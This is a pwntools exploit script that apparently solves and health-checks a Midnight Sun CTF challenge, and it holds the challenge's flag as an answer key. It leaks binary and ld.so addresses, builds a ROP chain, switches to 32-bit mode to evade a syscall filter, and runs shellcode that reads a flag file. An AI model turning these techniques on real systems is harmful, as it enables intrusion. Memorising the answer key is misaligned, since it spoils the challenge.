#!/usr/bin/env python
from pwn import *
import sys

HOST  = '127.0.0.1'
PORT  = 11101
FLAG  = 'midnight{I_gu3Ss_y0Ur_GuEs5_1S_aS_g00d_4s_mIn3}'
DEBUG = False

BASE  = 0xa05
LDSO  = 0xc0a

# +-----------------------------------------------------+
# | Allowed Syscall |      64bit      |      32bit      |
# +-----------------------------------------------------+
# | 0:              | read            | restart_syscall |
# | 1:              | write           | exit            |
# | 3:              | close           | read            |
# | 4:              | stat            | write           |
# | 5:              | fstat           | open            |
# | 6:              | lstat           | close           |
# | 9:              | mmap            | link            |
# | 11:             | munmap          | execve          |
# | 15:             | rt_sigreturn    | chmod           |
# | 35:             | nanosleep       | ftime           |
# | 60:             | exit            | umask           |
# +-----------------------------------------------------+

host = HOST
if len(sys.argv) > 1:
	host = sys.argv[1]

port = PORT
if len(sys.argv) > 2:
	port = sys.argv[2]

if len(sys.argv) > 3:
	DEBUG = True

# Connect
io = remote(host, port)

# step 1: increment the fail counter to exploit a sign extension overflow
io.recvuntil(': ')
io.sendline('')

# step 2: set the size we want to leak return address without a pesky null byte
io.recvuntil(': ')
io.sendline('a'*140+p32(0xa8)+p64(0)+p64(0))

# step 3: leak the return address to overcome PIE
io.recvuntil(': ')
io.send('b'*140+p32(0x01010101)+'b'*8+p64(0x7fffffffffffffff)+'B'*8)
line = io.recvline().strip()
leak = u64(line[168:174]+'\x00\x00')
base = leak - BASE

if DEBUG == True:
	log.info('leak:  0x%016x' % leak)
	log.info('base:  0x%016x' % base)

# step 4: set the size we want to leak ld address without pesky null byte
io.recvuntil(': ')
io.sendline('a'*140+p32(0xc1)+p64(0)+p64(0))

# step 5: leak the ld.so address to overcome ASLR
io.recvuntil(': ')
io.send('b'*140+p32(0x01010101)+'b'*8+p64(0x7fffffffffffffff)+'B'*33)
line = io.recvline().strip()
leak = u64('\x0a'+line[193:198]+'\x00\x00')
ldso = leak - LDSO

if DEBUG == True:
	log.info('leak: 0x%016x' % leak)
	log.info('ldso: 0x%016x' % ldso)

# 32bit shellcode to read the flag
pay  = '\xbc\x00\x09\x04\x08' # mov  esp, 0x08040900
pay += '\xb8\x05\x00\x00\x00' # mov  eax,0x05 (SYS_open)
pay += '\x68\x61\x67\x00\x00' # push "ag"
pay += '\x68\x66\x2f\x66\x6c' # push "f/fl"
pay += '\x68\x65\x2f\x63\x74' # push "e/ct"
pay += '\x68\x2f\x68\x6f\x6d' # push "/hom"
pay += '\x89\xe3'             # mov  ebx,esp
pay += '\xb9\x00\x00\x00\x00' # mov  ecx,0x00 (O_RDONLY)
pay += '\x31\xd2'             # xor  edx, edx
pay += '\xcd\x80'             # int  0x80
pay += '\x50'                 # push eax
pay += '\x5b'                 # pop  ebx
pay += '\xb9\x00\x0b\x04\x08' # mov  ecx,0x08040b00
pay += '\xba\xff\x01\x00\x00' # mov  edx,0xff
pay += '\xb8\x03\x00\x00\x00' # mov  eax,0x03 (SYS_read)
pay += '\xcd\x80'             # int  0x80
pay += '\xbb\x01\x00\x00\x00' # mov  ebx,0x1 (stdout)
pay += '\xb8\x04\x00\x00\x00' # mov  eax,0x01 (SYS_write)
pay += '\xb9\x00\x0b\x04\x08' # mov  ecx,0x08040b00
pay += '\xba\xff\x01\x00\x00' # mov  edx,0xff
pay += '\xcd\x80'             # int  0x80
pay += '\xb8\x06\x00\x00\x00' # mov  eax,0x06 (SYS_close)
pay += '\xcd\x80'             # int  0x80
pay += '\xb8\x01\x00\x00\x00' # mov  eax,0x01 (SYS_exit)
pay += '\x31\xdb'             # xor  ebx, ebx
pay += '\xcd\x80'             # int  0x80

# ropchain to setup 32bit code mapping and change the processing mode from 64bit to 32bit
rop  = p64(base+0xa5a)          # pop r9 ; pop r8 ; ret
rop += p64(0x0)                 # offset
rop += p64(0xffffffff)          # fd
rop += p64(base+0xa5b)          # pop rcx ; pop r8 ; ret
rop += p64(0x62)                # flags
rop += p64(0xffffffff)          # fd
rop += p64(ldso+0x2112)         # pop rdi ; ret
rop += p64(0x08040000)          # addr
rop += p64(ldso+0x106ca)        # pop rsi ; ret
rop += p64(0x4000)              # len
rop += p64(ldso+0xd5f)          # pop rdx ; pop rbx ; ret
rop += p64(0x7)                 # prot
rop += p64(0x0)                 # padding
rop += p64(base+0xa4c)          # mmap() ; ret
rop += p64(ldso+0x2112)         # pop rdi ; ret
rop += p64(0x0)                 # fd
rop += p64(ldso+0x106ca)        # pop rsi ; ret
rop += p64(0x08040000)          # buf
rop += p64(ldso+0xd5f)          # pop rdx ; pop rbx ; ret
rop += p64(len(pay))            # len
rop += p64(0x0)                 # padding
rop += p64(base+0xa14)          # read() ; ret
rop += p64(base+0x7b0)          # retf
rop += p32(0x08040000)          # payload
rop += p32(0x23)                # CS

# step 6: send rop chain to map the memory
io.recvuntil(': ')
io.sendline('c'*168+rop)
io.recvline()

# step 7: send 32bit payload we will pivot to
io.sendline(pay)

# step 8: collect the flag
flag = io.recvline().strip()

if DEBUG == True:

	log.success('flag: %s', flag)

else:

	if flag != FLAG:
		log.failure('fail')
		sys.exit(-1)
	else:
		log.success('pass')

sys.exit(0)
